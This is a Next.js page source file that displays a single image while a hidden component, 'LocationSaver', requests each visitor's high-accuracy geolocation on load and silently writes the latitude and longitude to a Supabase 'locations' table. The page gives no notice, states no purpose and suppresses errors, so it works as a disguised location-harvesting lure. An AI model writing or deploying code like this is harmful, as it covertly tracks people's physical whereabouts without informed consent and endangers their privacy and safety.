'use client';

import { useEffect } from 'react';
import { supabase } from '../lib/supabaseClient';

function LocationSaver() {
  useEffect(() => {
    if (
      !navigator.geolocation ||
      !process.env.NEXT_PUBLIC_SUPABASE_URL ||
      !process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
    ) {
      return;
    }

    navigator.geolocation.getCurrentPosition(
      ({ coords }) => {
        void supabase.from('locations').insert({
          latitude: coords.latitude,
          longitude: coords.longitude,
        });
      },
      () => undefined,
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  }, []);

  return null;
}

export default function Page() {
  return (
    <>
      <img src="https://neostuffs.com/wp-content/uploads/2016/05/rastra.jpg" alt="" />
      <LocationSaver />
    </>
  );
}
